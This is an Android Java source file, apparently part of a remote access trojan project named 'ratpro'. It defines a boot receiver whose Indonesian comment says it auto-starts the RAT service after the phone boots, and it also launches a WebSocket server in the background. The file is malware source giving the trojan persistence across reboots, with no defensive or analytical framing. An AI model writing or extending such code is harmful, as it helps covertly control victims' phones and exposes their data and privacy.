package com.realzy.ratpro;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Auto-start RAT Service setelah HP booting
        Intent serviceIntent = new Intent(context, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

        // Auto-start WebSocket Server
        Intent wsIntent = new Intent(context, WebSocketServer.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(wsIntent);
        } else {
            context.startService(wsIntent);
        }
    }
}